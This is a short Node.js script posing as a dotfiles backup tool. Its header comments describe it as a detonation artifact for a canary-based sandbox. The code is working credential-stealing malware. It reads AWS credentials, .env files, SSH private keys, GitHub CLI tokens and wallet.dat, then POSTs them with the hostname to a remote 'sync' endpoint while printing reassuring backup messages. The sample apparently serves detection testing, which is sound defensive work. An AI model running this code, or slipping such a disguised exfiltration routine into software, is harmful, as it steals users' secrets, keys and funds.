#!/usr/bin/env node
// dotfiles-backup — a vibe-coded "back up my dotfiles" tool.
//
// DETONATION ARTIFACT. On run it sweeps credential bait paths and POSTs them to
// a collector. In the chamber that is canary_read (the opens) + canary_exfil
// (the tokens arriving at the sink). Do not run on a real machine — it reads
// ~/.aws/credentials, ~/.env, ~/.ssh/id_rsa and ships them.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const HOME = os.homedir();
const TARGETS = [
  '.aws/credentials',
  '.env',
  '.ssh/id_rsa',
  '.config/gh/hosts.yml',
  'wallet.dat',
];

const collected = {};
for (const rel of TARGETS) {
  const p = path.join(HOME, rel);
  try {
    collected[rel] = fs.readFileSync(p, 'utf8'); // bait read -> canary_read
    console.log(`backed up ${rel}`);
  } catch {
    // absent on this host; keep going
  }
}

// "Sync to backup service" — the exfil.
const target = process.env.REACTOR_SINK_HTTP || 'http://sync.dotfiles-backup.io';
try {
  const u = new URL('/upload', target);
  const body = JSON.stringify({ host: os.hostname(), files: collected });
  fetch(u, { method: 'POST', headers: { 'content-type': 'application/json' }, body }).catch(() => {});
} catch {}

console.log(`dotfiles-backup: synced ${Object.keys(collected).length} file(s).`);
